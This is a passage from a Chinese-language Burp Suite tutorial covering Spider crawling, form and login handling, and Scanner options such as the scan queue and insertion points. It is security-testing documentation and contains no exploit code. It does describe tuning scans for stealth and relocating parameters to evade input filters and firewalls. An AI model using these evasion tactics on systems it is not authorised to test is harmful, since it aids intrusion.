范围配置为只在这个分支上。</p>\n<p>你应该小心地使用 Burp Spider。在它的默认设置上，Spider 会在 spidering 范围内使用 默认输入值，自动地提交任意表格，并且会请求许多平常用户在只使用一个浏览器不会发出 的请求。如果在你定义范围的 URL 是用来执行敏感操作的，这些操作都会被带到应用程序 上。在你完全地开始自动探索内容之前，使用浏览器对应用程序进行一些手动的映射，是非常可取的。</p>\n<h3 id=\"Control-tab\"><a href=\"#Control-tab\" class=\"headerlink\" title=\"Control tab\"></a>Control tab</h3><p>这个选项是用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。</p>\n<h4 id=\"Spider-Status\"><a href=\"#Spider-Status\" class=\"headerlink\" title=\"Spider Status\"></a>Spider Status</h4><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120887420.png\" alt=\"Image041\" title=\"image041.png\"></p>\n<h4 id=\"1-Spider-running\"><a href=\"#1-Spider-running\" class=\"headerlink\" title=\"1)Spider running\"></a>1)Spider running</h4><p>这个是用来开始和停止 Spider。Spider 停止后，它自己不会产生请求，但它会 继续处理通过 Burp Proxy 的响应，并且在 spidering 范围内的新发现的项都会送入请求队列 里，当 Spider 重新启动时，再来请求。这里显示的一些 Spider 进度的指标，让你能看到剩余的内容和工作量的大小。</p>\n<h4 id=\"2-Clear-queues\"><a href=\"#2-Clear-queues\" class=\"headerlink\" title=\"2)Clear queues\"></a>2)Clear queues</h4><p>如果你想改变你工作的优先权，你可以完全地清除当前队列的项目，来让其他 的项目加入队列。注意如果被清除的项目如果还在范围内并且 Spider 的分析器发现有新的 链接到这个项目，那么它们还会加入队列。</p>\n<h4 id=\"Spider-Scope\"><a href=\"#Spider-Scope\" class=\"headerlink\" title=\"Spider Scope\"></a>Spider Scope</h4><p>在这个面板里，你能精确地定义 Spider 的请求范围。最好的方法通常是使用一套广泛的目标范围，默认情况下，蜘蛛会使用该范围。如果您需要定义不同范围的蜘蛛使用，然后选择“Use custom scope(使用自定义范围)”。进一步的配置面板会出现在相同的方式套件范围的目标范围内面板的功能。如果你使用自定义范围并向 Spider 发送不在范围内 的项，则 Burp 会自动更新这个自定义的范围而不是 Suite 范围。</p>\n<h4 id=\"Options-tab\"><a href=\"#Options-tab\" class=\"headerlink\" title=\"Options tab\"></a>Options tab</h4><p>这个选项里包含了许多控制 Burp Spider 动作的选项，如下描述。这些设置在 spider 启 动后还可以修改的，并且这修改对先前的结果也是有效的。例如，如果增加了最大链接深度， 在以前的最大链接深度外的链接如果满足现在的条件，也会加入到请求队列里。</p>\n<h4 id=\"Crawler-Settings\"><a href=\"#Crawler-Settings\" class=\"headerlink\" title=\"Crawler Settings\"></a>Crawler Settings</h4><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120858563.png\" alt=\"Image043\" title=\"image043.png\"></p>\n<h4 id=\"1-check-robots-txt\"><a href=\"#1-check-robots-txt\" class=\"headerlink\" title=\"1)check robots.txt\"></a>1)check robots.txt</h4><p>如果这个选项被选中，Burp Spider会要求和处理robots.txt文件，提取内容链接。这个文件是由机器人排除协议控制的蜘蛛状制剂在互联网上的行为。请注意，注意 Burp Spider不会确认 robots 排除协议。Burp Spider 会列举出目标应用程序的所有内容，请求所有在范围 内的 robots.txt 条目。</p>\n<h4 id=\"2-detect-custom-“not-found”-responses\"><a href=\"#2-detect-custom-“not-found”-responses\" class=\"headerlink\" title=\"2)detect custom “not found” responses\"></a>2)detect custom “not found” responses</h4><p>HTTP协议需要向Web服务器返回404状态码，如果一个请求的资源不存在。然而，许多Web应用程序返回使用不同的状态代码定制为“not found”的网页。如果是这种情况，则使用该选项可以防止误报的网站内容的映射。Burp Spider从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测定制“not found”的回应。</p>\n<h4 id=\"3-ignore-links-to-non-text-content\"><a href=\"#3-ignore-links-to-non-text-content\" class=\"headerlink\" title=\"3)ignore links to non-text content\"></a>3)ignore links to non-text content</h4><p>常常需要推断出在 HTML 上下文里链接到特殊资源的 MIME 类型。例如，带有 IMG 标记的 URL 会返回图像；那些带有 SCRIPT 标记的会返回 JavaScript。 如果这个选项被选中，Spider 不会请求在这个上下文出现的出现的非文本资源。使用这个选 项，会减少 spidering 时间，降低忽略掉感兴趣内容的风险。</p>\n<h4 id=\"4-request-the-root-of-all-directories-如果这个选项被选中，Burp-Spider-会请求所有已确认的目标-范围内的-web-目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的，-这选项将是非常的有用。\"><a href=\"#4-request-the-root-of-all-directories-如果这个选项被选中，Burp-Spider-会请求所有已确认的目标-范围内的-web-目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的，-这选项将是非常的有用。\" class=\"headerlink\" title=\"4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。\"></a>4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。</h4><h4 id=\"5-make-a-non-parameterised-request-to-each-dynamic-page\"><a href=\"#5-make-a-non-parameterised-request-to-each-dynamic-page\" class=\"headerlink\" title=\"5)make a non-parameterised request to each dynamic page\"></a>5)make a non-parameterised request to each dynamic page</h4><p>如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出添加的站点内容和功能。</p>\n<h4 id=\"6-maximum-link-depth\"><a href=\"#6-maximum-link-depth\" class=\"headerlink\" title=\"6)maximum link depth\"></a>6)maximum link depth</h4><p>这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。</p>\n<h4 id=\"7-Maximum-parameterized-requests-per-URL\"><a href=\"#7-Maximum-parameterized-requests-per-URL\" class=\"headerlink\" title=\"7)Maximum parameterized requests per URL\"></a>7)Maximum parameterized requests per URL</h4><p>请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容，如在URL中的日期参数的日历应用程序。</p>\n<h2 id=\"Passive-Spidering-被动扫描\"><a href=\"#Passive-Spidering-被动扫描\" class=\"headerlink\" title=\"Passive Spidering(被动扫描)\"></a>Passive Spidering(被动扫描)</h2><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120825072.png\" alt=\"Image045\" title=\"image045.png\"></p>\n<h4 id=\"1-passively-spider-as-you-browse\"><a href=\"#1-passively-spider-as-you-browse\" class=\"headerlink\" title=\"1)passively spider as you browse\"></a>1)passively spider as you browse</h4><p>如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。</p>\n<h4 id=\"2-link-depth-to-associate-with-proxy-requests\"><a href=\"#2-link-depth-to-associate-with-proxy-requests\" class=\"headerlink\" title=\"2)link depth to associate with proxy requests\"></a>2)link depth to associate with proxy requests</h4><p>这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。</p>\n<h3 id=\"Form-Submission\"><a href=\"#Form-Submission\" class=\"headerlink\" title=\"Form Submission\"></a>Form Submission</h3><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120952125.png\" alt=\"Image047\" title=\"image047.png\"></p>\n<h4 id=\"1-individuate-forms\"><a href=\"#1-individuate-forms\" class=\"headerlink\" title=\"1)individuate forms\"></a>1)individuate forms</h4><p>这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。</p>\n<h4 id=\"2-Don’t-submit\"><a href=\"#2-Don’t-submit\" class=\"headerlink\" title=\"2)Don’t submit\"></a>2)Don’t submit</h4><p>如果选中这个，Burp Spider 不会提交任何表单。</p>\n<h4 id=\"3-prompt-for-guidance\"><a href=\"#3-prompt-for-guidance\" class=\"headerlink\" title=\"3)prompt for guidance\"></a>3)prompt for guidance</h4><p>如果选中这个，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个 区域，以及是否遍历整个区域。</p>\n<h4 id=\"4-automatically-submit\"><a href=\"#4-automatically-submit\" class=\"headerlink\" title=\"4)automatically submit\"></a>4)automatically submit</h4><p>如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。可以为任意不匹配的字段指定默认值。</p>\n<p>在应用程序通常需要对所有输入域都是有效格式的数据的地方，如果你想通过登记表单 和相似功能自动地 spider，则这个选项会非常有用。在自动地把表单数据提交到广阔范围内 的应用程序时，Burp 使用一组非常成功的规则。当然，如果你遇到有自己需要提交的特定 值的表单字段名时，你可以修改这些或者添加自己的规则。你要小心地使用这个选项，因为 提交了表单里的虚假值有时会导致一些不希望看到操作。</p>\n<p>许多表单包含了多个提交元素，这些会对应用程序进行不同的操作，和发现不同的内容。 你可以配置 Spider 重复通过表单里提交元素的值，向每个表单提交多次，次数低于配置的 最大值。</p>\n<h3 id=\"Application-Login\"><a href=\"#Application-Login\" class=\"headerlink\" title=\"Application Login\"></a>Application Login</h3><p><img src=\"https://wooyun.js.org/images_result/images/2014101711120998771.png\" alt=\"Image049\" title=\"image049.png\"></p>\n<p>登陆表单在应用程序中扮演一个特殊角色，并且你常常会让 Burp 用和处理平常表单不 一样的方式来处理这个表单。使用这个配置，你可以告诉 Spider 在遇到一个表单执行下面 4 种不同操作的一种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.如果你没有证书，或者关注 Spidering 的敏感保护功能，Burp 可以忽略登陆表单。</span><br><span class=\"line\">2.Burp 能交互地为你提示引导，使你能够指定证书。这时默认设置项。</span><br><span class=\"line\">3.Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。</span><br><span class=\"line\">4.在遇到的每个登陆表单时，Burp 能自动地提交特定的证书。 </span><br></pre></td></tr></table></figure>\n\n<p>在最后一种情况下，任何时间 Burp 遇到一个包含密码域的表单，会提交你配置的密码到密码域，提交你配置用户名到最像用户名的字段域。如果你有应用程序的证书，想让 Spider为你处理登陆，通常情况下这是最好的选项</p>\n<h3 id=\"Spider-Engine\"><a href=\"#Spider-Engine\" class=\"headerlink\" title=\"Spider Engine\"></a>Spider Engine</h3><p><img src=\"https://wooyun.js.org/images_result/images/2014101711121055065.png\" alt=\"Image051\" title=\"image051.png\"></p>\n<p>这些设置控制用于Spidering时发出HTTP请求的引擎。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Number of threads----此选项控制并发请求进程数。</span><br><span class=\"line\">2)Number of retries on network failure----如果出现连接错误或其他网络问题，BurpSuite会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class=\"line\">3)Pause before retry----当重试失败的请求，BurpSuite会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器被宕掉、繁忙或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br><span class=\"line\">4)Throttle between requests----BurpSuite可以在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。</span><br><span class=\"line\">5)Add random variations to throttle----此选项可以通过降低您的要求的时序模式进一步增加隐身。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Request-Headers\"><a href=\"#Request-Headers\" class=\"headerlink\" title=\"Request Headers\"></a>Request Headers</h3><p>这些设置控制由蜘蛛发出的HTTP请求中使用的请求头。您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 - 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。</p>\n<p>以下选项也可用：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121061095.png\" alt=\"Image053\" title=\"image053.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Use HTTP version 1.1----如果选中，Spider会使用HTTP1.1版在其请求;否则，它会使用1.0版。</span><br><span class=\"line\"></span><br><span class=\"line\">2)Use Referer header----如果选中，Spider会要求从另一个页面链接到任何项目时提交相关Referer头。此选项很有用更加紧密地模拟将通过您的浏览器发出的请求，并且还可能需要浏览一些应用程序验证Referer头。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Scanner功能\"><a href=\"#Scanner功能\" class=\"headerlink\" title=\"Scanner功能\"></a>Scanner功能</h2><h3 id=\"Using-Burp-Scanner\"><a href=\"#Using-Burp-Scanner\" class=\"headerlink\" title=\"Using Burp Scanner\"></a>Using Burp Scanner</h3><p>分以下几个步骤来简单使用Scanner 1.设置好代理之后在地址栏输入你要抓取的地址，并且要在Proxy里把拦截关了，随后切换到Scanner的Results就可以看到地址已经在开始扫描咯</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121128756.png\" alt=\"Image055\" title=\"image055.png\"></p>\n<p>2.对地址右击还可以导出报告，</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121157380.png\" alt=\"Image057\" title=\"image057.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121141522.png\" alt=\"Image059\" title=\"image059.png\"></p>\n<p>Html或者xml随便你以什么格式的，然后一直下一步下一步到如下图选择保存文件到哪</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121154576.png\" alt=\"Image061\" title=\"image061.png\"></p>\n<p>我们打开看看，是不是很漂亮呢</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121194134.png\" alt=\"Image063\" title=\"image063.png\"></p>\n<p>3.如果扫描出漏洞了我们还可以直接在这针对某个漏洞进行查看，如果想测试的话可以发送到Repeater进行测试哦</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121260493.png\" alt=\"Image065\" title=\"image065.png\"></p>\n<h3 id=\"Results\"><a href=\"#Results\" class=\"headerlink\" title=\"Results\"></a>Results</h3><p>结果选项卡包含所有的扫描仪已确定，从主动和被动扫描的问题。以一种树型图显示应用程序的内容，其中的问题已经被发现，使用URL分解成域，目录和文件的层次表示。如果您选择一个或多个部分的分支，所有选定的项目将扫描的问题都列出来，用组合在一起的相同类型的问题。您还可以扩大这些问题汇总查看所有的每种类型的个别问题。 如果您选择的问题那么将显示相应的详情，包括：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)自定义的漏洞，咨询内容包括：</span><br><span class=\"line\">问题类型及其整治的标准描述。</span><br><span class=\"line\">中适用于该问题，并影响其修复任何特定的功能的描述。</span><br><span class=\"line\">2)完整的请求和响应都是依据报告了该问题。在适用的情况，是相关的识别和再现问题的请求和响应的部分在请求和响应消息的编辑器中突出显示。</span><br></pre></td></tr></table></figure>\n\n<p>通常情况下，测试并验证一个问题最快的方法是使用发送到Repeater。另外，对于GET请求，您可以复制此URL，并将其粘贴到浏览器中。然后，您可以重新发出请求。 Burp扫描报告描述，每一个问题都会给出严重程度（高，中，低，资讯）和置信度（肯定的，坚定的，暂定）的评级。当一个问题一直使用一种技术，本质上是不太可靠（如SQL盲注）确定，Burp会让你意识到这一点，通过丢弃的置信水平存在一定不足。这些额定值应始终被解释为指示性的，你应该根据你的应用程序的功能和业务方面的知识进行审查。</p>\n<p>这个问题已经上市，你可以用它来执行以下操作的上下文菜单：如图所示</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121228957.png\" alt=\"Image067\" title=\"image067.png\"></p>\n<h3 id=\"Report-selected-issues\"><a href=\"#Report-selected-issues\" class=\"headerlink\" title=\"Report selected issues\"></a>Report selected issues</h3><p>启动BurpSuite Scanner的报告向导，生成的选定问题的正式报告。 Set severity - 这让你重新分配问题的严重程度。您可以设置严重程度高，中，低，或信息。您还可以标记问题作为假阳性。</p>\n<h3 id=\"Delect-selected-issues\"><a href=\"#Delect-selected-issues\" class=\"headerlink\" title=\"Delect selected issues\"></a>Delect selected issues</h3><p>删除选定问题。请注意，如果你删除了一个问题，Burp重新发现了同样的问题（例如，如果你重新扫描了同样的要求），那么问题将再次报告。相反，如果你是一个假阳性标记的问题，那么这将不会发生。因此，最适合用于清理扫描结果移除你不感兴趣。对于内部的功能不需要您的问题仍然工作在主机或路径删除的问题，您应该使用假阳性的选项。</p>\n<h3 id=\"Scan-Queue\"><a href=\"#Scan-Queue\" class=\"headerlink\" title=\"Scan Queue\"></a>Scan Queue</h3><p>Active Scanning(主动扫描)过程通常包括发送大量请求到服务器为所扫描的每个基本的请求，这可能是一个耗时的过程。当您发送的主动扫描请求，这些被添加到活动扫描队列，它们被依次处理。如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121261155.png\" alt=\"Image069\" title=\"image069.png\"></p>\n<p>扫描队列中显示每个项目的详细信息如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)索引号的项目，反映该项目的添加顺序。</span><br><span class=\"line\">2)目的地协议，主机和URL 。</span><br><span class=\"line\">3)该项目的当前状态，包括完成百分比。</span><br><span class=\"line\">4)项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。</span><br><span class=\"line\">5)在扫描项目的请求数量进行。</span><br><span class=\"line\">注意 这不是插入点的数量的线性函数 - 观察应用程序行为的反馈到后续攻击的请求，仅仅因为它会为一个测试仪。</span><br><span class=\"line\">6)网络错误的数目遇到的问题。</span><br><span class=\"line\">7)为项目创建的插入点的数量。</span><br></pre></td></tr></table></figure>\n\n<p>这些信息可以让您轻松地监控个别扫描项目的进度。如果您发现某些扫描进度过于缓慢，可以理解的原因，如大量的插入点，缓慢的应用响应，网络错误等给定这些信息，你就可以采取行动来优化你的扫描，通过改变配置为插入点时，扫描引擎，或正在测试的主动扫描区域。</p>\n<p>你可以双击任何项目在扫描队列显示，到目前为止发现的问题，并查看了基本请求和响应的项目。您可以使用扫描队列的上下文菜单来执行各种操作来控制扫描过程。确切的可用选项取决于所选的项目（S ）的状态，并包括：如下图所示</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121223207.png\" alt=\"Image071\" title=\"image071.png\"></p>\n<h3 id=\"Show-details\"><a href=\"#Show-details\" class=\"headerlink\" title=\"Show details\"></a>Show details</h3><p>这将打开显示到目前为止发现的问题的一个窗口，与底座请求和响应的项目。</p>\n<h3 id=\"Scan-again\"><a href=\"#Scan-again\" class=\"headerlink\" title=\"Scan again\"></a>Scan again</h3><p>此复制所选择的项目（S ） ，并将这些队列的末尾。</p>\n<h3 id=\"Delete-item-S\"><a href=\"#Delete-item-S\" class=\"headerlink\" title=\"Delete item(S)\"></a>Delete item(S)</h3><p>这将永久地从队列中删除选定的项目（S ） 。</p>\n<h3 id=\"Delect-finished-items\"><a href=\"#Delect-finished-items\" class=\"headerlink\" title=\"Delect finished items\"></a>Delect finished items</h3><p>这永久删除那些已经完成了队列中的任何项目。</p>\n<h3 id=\"Automatically-delete-finished-items\"><a href=\"#Automatically-delete-finished-items\" class=\"headerlink\" title=\"Automatically delete finished items\"></a>Automatically delete finished items</h3><p>这是否切换扫描器会自动从队列为他们完成删除项目。</p>\n<h3 id=\"Pause-resume-scanner\"><a href=\"#Pause-resume-scanner\" class=\"headerlink\" title=\"Pause&#x2F;resume scanner\"></a>Pause&#x2F;resume scanner</h3><p>这可以暂停和恢复激活扫描仪。如果任何扫描正在进行时，扫描会暂停，而挂起的扫描请求完成后，通常会有一个短暂的延迟。</p>\n<h3 id=\"Send-to\"><a href=\"#Send-to\" class=\"headerlink\" title=\"Send to\"></a>Send to</h3><p>这些选项用于所选项目的基本请求发送到其它Burp(Repeater、Intruder)工具。</p>\n<h3 id=\"Live-Scanning\"><a href=\"#Live-Scanning\" class=\"headerlink\" title=\"Live Scanning\"></a>Live Scanning</h3><p>实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning和live passive两种扫描模式。如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121272043.png\" alt=\"Image073\" title=\"image073.png\"></p>\n<h3 id=\"Live-active-scanning\"><a href=\"#Live-active-scanning\" class=\"headerlink\" title=\"Live active scanning\"></a>Live active scanning</h3><p>执行现场主动扫描，请执行以下步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)配置与目标的细节，你要主动扫描现场主动扫描设置。如果你已经配置了一套全范围的目标为你目前的工作，那么你可以简单地通知Burp主动扫描落在该范围内的每个请求。或者，您可以使用URL匹配规则定义自定义范围。 </span><br><span class=\"line\">2)各地通过BurpProxy通常的方式应用浏览。这将有效地展示Burp要扫描的应用功能。对于每一个独特的所在范围的要求，你通过你的浏览器，Burp会排队主动扫描请求，并将努力走在后台找到漏洞为您服务。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Live-Passive-Scanning\"><a href=\"#Live-Passive-Scanning\" class=\"headerlink\" title=\"Live Passive Scanning\"></a>Live Passive Scanning</h3><p>现场演示被动扫描，请执行以下步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)配置具有您要被动地扫描目标的细节live passive scanning。默认情况下，Burp执行所有请求的被动扫描，但你可以限制扫描目标范围，或者使用URL匹配规则的自定义范围。 </span><br><span class=\"line\">2)通过BurpProxy通常的方式应用浏览。这将有效地展示Burp你要扫描的应用功能。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Options-1\"><a href=\"#Options-1\" class=\"headerlink\" title=\"Options\"></a>Options</h3><p>此选项卡包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。</p>\n<h3 id=\"Attack-Insertion-Points\"><a href=\"#Attack-Insertion-Points\" class=\"headerlink\" title=\"Attack Insertion Points\"></a>Attack Insertion Points</h3><p>这些设置控制扫描仪的地方“插入点(insertion points)”到被发送的主动扫描每个基本要求。插入点攻击将被放置，探测漏洞请求中的位置。每个定义的插入点单独扫描。 BurpSuite为您提供细粒度地控制放置插入点，以及这些选项仔细配置会让您量身定制您的扫描到您的目标应用程序的性质。插入点的配置也代表你的扫描速度和全面性之间进行权衡。</p>\n<p>注：除了让Burp自动指定插入点，就可以完全自定义这些，这样你就可以在你想要攻击的地方放在任意一个位置。要使用此功能，将请求发送给Intruder，用payload positions标签来定义通常的方式各插入点的开始和结束，并选择入侵者菜单选项“积极定义扫描插入点” 。您也可以指定以编程方式使用Burp扩展的自定义插入点位置。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121335428.png\" alt=\"Image075\" title=\"image075.png\"></p>\n<h4 id=\"1-Insertion-Point-Locations\"><a href=\"#1-Insertion-Point-Locations\" class=\"headerlink\" title=\"1)Insertion Point Locations\"></a>1)Insertion Point Locations</h4><p>这些设定可让您选择，其中插入点应放在请求中的位置的类型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URLparameter values - URL查询字符串中标准的参数值。</span><br><span class=\"line\">Body parameter values - 在邮件正文中，包括标准形式生成的参数参数值，属性的多重编码的参数，如上传的文件名， XML参数值和属性，和JSON值。</span><br><span class=\"line\">Cookieparameter values - 的HTTP Cookie的值。</span><br><span class=\"line\">Parameter name - 任意添加的参数的名称。 URL参数总是被添加，并且机身参数也加入到POST请求。测试一个附加的参数名称通常可以检测到被错过，如果只是参数值进行了测试异常的错误。</span><br><span class=\"line\">HTTPheaders - 在引用页和用户代理标头的值。测试这些插入点通常可以检测如SQL注入或跨站脚本持续在日志记录功能的问题。</span><br><span class=\"line\">AMF string parameters- 内AMF编码的邮件的任何字符串数据的值。</span><br><span class=\"line\">REST-style URL parameters - URL的文件路径部分中的所有目录和文件名令牌的值。测试每一个插入点可以并处显著开销，如果你相信应用程序使用这些位置传送参数数据，才应使用。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-Change-Parameter-Locations\"><a href=\"#2-Change-Parameter-Locations\" class=\"headerlink\" title=\"2)Change Parameter Locations\"></a>2)Change Parameter Locations</h4><p>允许您配置扫描仪将一些类型的插入点到其他地点的请求中，除了测试他们在原来的位置。例如，您可以将每个URL参数到邮件正文中，并重新测试它。或者你可以移动身体的每个参数到一个cookie ，然后重新测试它。</p>\n<p>用这种移动参数方式往往可以绕过防过滤器。许多应用程序和应用程序防火墙执行每个参数输入验证假设每个参数是它的预期位置的要求之内。移动参数到不同的位置可以回避这个验证。当应用程序代码后检索参数来实现其主要的逻辑，它可能会使用一个API，它是不可知的，以参数的位置。如果是这样，那么移动的参数可能可以使用输入，通常会在处理之前被过滤，以达到易受攻击的代码路径。</p>\n<p>下列选项可用于更改参数的位置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL to body</span><br><span class=\"line\">URL to cookie</span><br><span class=\"line\">Body to URL</span><br><span class=\"line\">Body to cookie</span><br><span class=\"line\">Cookie to URL</span><br><span class=\"line\">Cookie to body</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-Nested-Insertion-Points\"><a href=\"#3-Nested-Insertion-Points\" class=\"headerlink\" title=\"3)Nested Insertion Points\"></a>3)Nested Insertion Points</h4><p>嵌套的插入时，会使用一个插入点的基值包含可识别的格式的数据。 例如，一个URL参数可能包含Base64编码数据，并且将解码后的值可能又包含JSON或XML数据。与使用启用嵌套插入点的选项，Burp会为输入在每个嵌套级别中的每个单独的项目适合的插入点。 Spider仅包含常规的请求参数请求时使用此选项不征收费用，但允许Burp达到更复杂的应用，数据是在不同的格式封装的攻击面。</p>\n<h4 id=\"4-Maximum-Insertion-Points-Per-Request\"><a href=\"#4-Maximum-Insertion-Points-Per-Request\" class=\"headerlink\" title=\"4)Maximum Insertion Points Per Request\"></a>4)Maximum Insertion Points Per Request</h4><p>无论你的设置选择，对于单个请求插入点的数目，一般视乎该请求的功能，如参数的数目。偶尔，请求可以包含的参数（几百或更多）数量。如果Burp执行的每个参数进行完全扫描，扫描会花费过多的时间量完成。 此设置允许您设置的，将每个基本要求生成插入点的数量的限制，从而防止您的扫描由偏快转为停滞，如果他们遇到含参数庞大的数字请求。在其中插入点的数量是由这个限制缩减的情况下，在有效扫描队列中的项目的条目将显示被跳过的插入点的数量，使您能够手动检查基本要求，并决定是否值得执行完全扫描其所有可能的插入点。</p>\n<h4 id=\"5-Skipping-Parameters\"><a href=\"#5-Skipping-Parameters\" class=\"headerlink\" title=\"5)Skipping Parameters\"></a>5)Skipping Parameters</h4><p>设定让您指定请求参数的Burp应该跳过某些测试。有跳过服务器端注入测试（如SQL注入）和跳过所有检查单独的列表。 服务器端注入测试是比较费时的，因为Burp发送多个请求探测服务器上的各种盲目的漏洞。如果您认为出现请求中的某些参数不容易（例如，内置仅由平台或Web服务器中使用的参数） ，你可以告诉Burp不能测试这些。 （用于测试客户端蝽象跨站点脚本涉及更少的开销，因为测试每个参数规定最小的开销在扫描期间，如果该参数不容易。 ） 如果一个参数是由您不希望测试一个应用程序组件来处理，或者修改一个参数是已知的导致应用程序不稳定跳过所有的测试可能是有用的。 列表中的每个项目指定参数类型，该项目要匹配（名称或值） ，匹配类型（文本字符串或正则表达式） ，表达式匹配。 你可以通过它们的位置（斜线分隔）的URL路径中标识的REST参数。要做到这一点，从参数下拉，“姓名”，从项目下拉“ REST参数” ，并指定您希望从测试中排除的URL路径中的位置的索引号（从1开始） 。您还可以通过值来指定REST参数。</p>\n<h3 id=\"Active-Scanning-Engine\"><a href=\"#Active-Scanning-Engine\" class=\"headerlink\" title=\"Active Scanning Engine\"></a>Active Scanning 